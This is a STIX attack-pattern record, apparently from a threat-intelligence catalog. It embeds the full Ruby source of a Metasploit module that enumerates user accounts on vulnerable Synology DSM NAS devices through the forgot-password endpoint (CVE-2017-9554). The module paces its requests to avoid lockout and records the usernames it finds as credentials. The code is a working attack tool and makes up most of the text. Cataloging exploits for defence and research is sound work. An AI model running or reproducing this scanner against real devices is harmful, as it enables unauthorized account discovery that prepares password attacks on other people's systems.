{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d79370d6-69d3-46c4-9f4c-4159a1d49258",
    "created": "2024-08-14T16:30:41.752594Z",
    "modified": "2024-08-14T16:30:41.752599Z",
    "name": "Synology Forget Password User Enumeration Scanner",
    "description": " This module attempts to enumerate users on the Synology NAS",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/synology_forget_passwd_user_enum.rb",
            "external_id": "synology_forget_passwd_user_enum.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-9554"
        },
        {
            "source_name": "reference",
            "url": "https://www.synology.com/en-global/security/advisory/Synology_SA_17_29_DSM"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Synology Forget Password User Enumeration Scanner',\n        'Description' => %q{\n          This module attempts to enumerate users on the Synology NAS\n          by sending GET requests for the forgot password URL.\n          The Synology NAS will respond differently if a user is present or not.\n          These count as login attempts, and the default is 10 logins in 5min to\n          get a permanent block.  Set delay accordingly to avoid this, as default\n          is permanent.\n          Vulnerable DSMs are:\n          DSM 6.1 < 6.1.3-15152\n          DSM 6.0 < 6.0.3-8754-4\n          DSM 5.2 < 5.2-5967-04\n        },\n        'Author' => [\n          'h00die', # msf module\n          'Steve Kaun' # POC\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'EDB', '43455' ],\n          [ 'CVE', '2017-9554' ],\n          [ 'URL', 'https://www.synology.com/en-global/security/advisory/Synology_SA_17_29_DSM' ]\n        ],\n        'DisclosureDate' => '2011-01-05',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ACCOUNT_LOCKOUTS, IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(5000),\n        OptString.new('TARGETURI', [true, 'The path to users Synology Web Interface', '/']),\n        OptPath.new('USER_FILE', [\n          false, 'File containing users, one per line',\n          File.join(Msf::Config.data_directory, 'wordlists', 'unix_users.txt')\n        ]),\n        OptInt.new('DELAY', [true, 'Seconds delay to add to avoid lockout', 36])\n      ]\n    )\n  end\n\n  def run_host(_ip)\n    @users_found = {}\n\n    unless File.readable?(datastore['USER_FILE'])\n      fail_with(Failure::BadConfig, 'USER_FILE can not be read')\n    end\n    users = File.new(datastore['USER_FILE']).read.split\n    users.each do |user|\n      do_enum(user)\n      vprint_status(\"Delaying #{datastore['DELAY']}s\") if datastore['DELAY'] > 0 # dont flood the prompt\n      Rex.sleep(datastore['DELAY'])\n    end\n\n    if @users_found.empty?\n      print_status(\"#{full_uri} - No users found.\")\n    else\n      print_good(\"#{full_uri} - Users found: #{@users_found.keys.sort.join(', ')}\")\n      report_note(\n        host: rhost,\n        port: rport,\n        proto: 'tcp',\n        sname: (ssl ? 'https' : 'http'),\n        type: 'users',\n        vhost: vhost,\n        data: { users: @users_found.keys.join(', ') }\n      )\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user]\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def do_enum(username)\n    vprint_status(\"Attempting #{username}\")\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'webman', 'forget_passwd.cgi'),\n      'method' => 'GET',\n      'vars_get' => {\n        'user' => username\n      }\n    })\n    unless res\n      print_error('Connection to host refused')\n      fail_with(Failure::Unreachable, 'Connection to host refused')\n    end\n    j = res.get_json_document\n    if j['msg'] == 5\n      fail_with(Failure::Disconnected, 'You have been locked out.  Retry later or increase DELAY')\n    end\n    if j['msg'] == 3\n      fail_with(Failure::UnexpectedReply, 'Device patched or feature disabled')\n    end\n    if j['msg'] == 2 || j['msg'] == 1\n      print_good(\"#{username} - #{j['info']}\")\n      @users_found[username] = :reported\n      report_cred(\n        ip: rhost,\n        port: rport,\n        service_name: (ssl ? 'https' : 'http'),\n        proof: res.body\n      )\n    end\n    # msg 1 means user can login to GUI\n    # msg 2 means user exists but no GUI login\n    # msg 3 means not supported/disabled/patched\n    # msg 4 means no user\n    # msg 5 means auto block is enabled and youre blocked. Default is 10 login attempts, and these\n    #     count as lgin attempts.\n  rescue Rex::ConnectionRefused, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionError\n    print_error('Connection to host refused')\n    fail_with(Failure::Unreachable, 'Connection to host refused')\n  rescue Timeout::Error, Errno::EPIPE\n    fail_with(Failure::Unreachable, 'Connection issue')\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2011-01-05"
}